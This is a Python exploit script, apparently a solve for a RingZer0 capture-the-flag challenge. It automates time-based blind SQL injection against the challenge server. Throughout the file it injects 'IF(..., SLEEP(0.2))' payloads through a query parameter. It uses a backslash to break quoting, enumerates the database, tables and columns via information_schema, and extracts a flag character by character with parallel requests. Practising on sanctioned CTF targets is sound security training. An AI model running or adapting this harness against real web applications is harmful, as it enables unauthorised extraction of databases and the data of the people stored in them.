import requests
from time import time
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://challenges.ringzer0team.com:10038"

CHS = [i for i in range(0x20, 0x7f)]
CHS.remove(ord("'"))
CHS.remove(ord("\\"))

def req(q, s):

    res = requests.get(f"{TARGET}/?q={q}&s={s}")
    return res.status_code, res.content

def time_req(cond, sleep_on_false=True):

    if sleep_on_false is True:
        r = f" OR 2=IF(({cond}),1,SLEEP(0.2)) -- -"
    else:
        r = f" OR 2=IF(({cond}),SLEEP(0.2),1) -- -"

    t = time()
    req("\\", r)
    t = time() - t

    return t

def max_from_time_queries(ts):

    l = None,
    t = -1

    for l_, t_ in ts.items():
        if t_ > t:
            l = l_ 
            t = t_

    return l

def trunc_common(s):

    idx_dif = len(s[0])

    for r in s.keys():

        if r == 0:
            continue
    
        idx_dif_ = 0
        while idx_dif_ < len(s[r]) and idx_dif_ < len(s[0]) and s[0][idx_dif_] == s[r][idx_dif_]:
            idx_dif_ += 1
        
        if idx_dif_ < idx_dif:
            idx_dif = idx_dif_

    return s[0][:idx_dif]

def str_to_hexrep(s):

    hr = 0

    i = 0
    while i < len(s):

        hr += ord(s[i])
        hr <<= 8

        i += 1

    hr >>= 8
    hr = hex(hr)

    return hr

def guess_entry_count():

    '''
        assuming N SLEEP calls for N ids
    '''

    TCNT = 4

    t = 0
    for _ in range(TCNT):

        t_ = time()
        req("1233456789")
        t += time() - t_

    tsleep = 0
    for _ in range(TCNT):

        t_ = time()
        req("SLEEP(0.1)")
        tsleep += time() - t_

    entry_cnt = (tsleep - t) // (TCNT * 0.1)

    print(f"probably {entry_cnt} entries")
    return entry_cnt

def db_name():

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        MAX_LEN = 20

        ROUND_CNT = 3
        dbname = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING(database(),{i + 1},1)),{c_ord})")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                dbname[r].append(chr(max_from_time_queries(ts)))

        print(dbname)

        dbname = trunc_common(dbname)
        dbname = ''.join(dbname)

        print(f"database name {dbname}")
        return dbname

def table_names(dbname):

    dbname = str_to_hexrep(dbname)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        table_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={dbname}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            table_cnt += f'{chr(max_from_time_queries(ts))}'

        table_cnt = int(table_cnt, 10)
        print(f"database {dbname} has {table_cnt} tables")

        MAX_LEN = 20

        ROUND_CNT = 3
        tables =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(table_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(table_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema={dbname} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                tables[r][t_idx] = ''.join(name)

        for t_idx in range(table_cnt):
            
            idx_dif = len(tables[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while tables[0][t_idx][idx_dif_] == tables[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            tables[0][t_idx] = tables[0][t_idx][:idx_dif]
            print(f"found table {tables[0][t_idx]}")

        return [tables[0][t_idx] for t_idx in range(table_cnt)]

def flag_table_columns(flag_table):

    flag_table = str_to_hexrep(flag_table)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        column_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name={flag_table}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            column_cnt += f'{chr(max_from_time_queries(ts))}'

        column_cnt = int(column_cnt, 10)
        print(f"flag table {flag_table} has {column_cnt} columns")

        MAX_LEN = 20

        ROUND_CNT = 3
        columns =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(column_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(column_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={flag_table} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                columns[r][t_idx] = ''.join(name)

        for t_idx in range(column_cnt):
            
            idx_dif = len(columns[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while columns[0][t_idx][idx_dif_] == columns[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            columns[0][t_idx] = columns[0][t_idx][:idx_dif]
            print(f"found columns {columns[0][t_idx]}")

        return [columns[0][t_idx] for t_idx in range(column_cnt)]

def read_flag_table(dbname, tablename, flag_column):

    flag_table = f"{dbname}.{tablename}"

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        MAX_LEN = 60

        ROUND_CNT = 3
        flag = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT {flag_column} FROM {flag_table}),{i + 1},1)),{c_ord})")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                flag[r].append(chr(max_from_time_queries(ts)))
            
        flag = trunc_common(flag)
        print(f"flag {flag}")

        flag = ''.join(flag)
        print(f"flag {flag}")

def break_the_cast():

    # so it was established that it is some form of cast
    # CAST() / CONVERT() / TO_NUMBER() / ????
    # how to escape it and inject smth?
    # bruteforce chars lol

    CHS_ = [i for i in range(0x20, 0x7f)]
    # anything else other than seq w \ ???
    #CHS_.remove(ord("\\"))

    L = 4

    def cart_prod(idx):

        if idx == 0:
            yield ""
            return

        for c in CHS_:
            for ch_seq in cart_prod(idx - 1):
                yield ch_seq + chr(c)

    with ThreadPoolExecutor(max_workers = 4) as threadpool:

        res = \
        {
            l:
            {
                ch_seq: None
                for ch_seq in cart_prod(l)
            }
            for l in range(L)
        }

        for l in range(L):
            for ch_seq in cart_prod(l):
                res[l][ch_seq] = threadpool.submit(req, "1", f"1e3{ch_seq}")

        for l in range(L):
            print(f"l={l}")

            for ch_seq in cart_prod(l):
                
                res[l][ch_seq] = res[l][ch_seq].result()
                _, content = res[l][ch_seq]

                if b"Quote of the day" in content:
                    continue

                elif b"No result found" in content:
                    print(f"error \"No result found\" for s={ch_seq}")

                else:
                    print(f"unknown response for s={ch_seq}")

def check_char_conversion():

    CHS_ = [i for i in range(0x20, 0x7f)]

    for c in CHS_:
        enc_c = f"%{hex(c)[2:]}"
        
        _, res = req(enc_c,"10")
        left = res.find("No result found for id \"".encode())
        res = res[left: left + len("No result found for id \"") + 10]

        print(f"{enc_c} - ascii {chr(c)}: {res}")

def start():

    #break_the_cast()
    # 1 char: \
    # 2 char: (*)\, \#, \&

    # check_char_conversion()
    #
    # ok so it appears to be a php with htmlspecialchars(..., ENT_QUOTES)
    # maybe something like ... CONVERT('htmlspecialchars(input, ENT_QUOTES)',DOUBLE) ... 
    # it looks like CONVERT because of the behaviour of the strings
    # but the injection suggests otherwise
    # anyways, time based sqli 

    #dbname = db_name()
    dbname = 'sqli_quote2'

    #tables = table_names(dbname)
    tables = ['qdyk5', 'quotes']

    #columns = flag_table_columns(tables[0])
    columns = ['id', 'flag']

    read_flag_table(dbname, tables[0], columns[1])

    return

if __name__ == "__main__":
    start()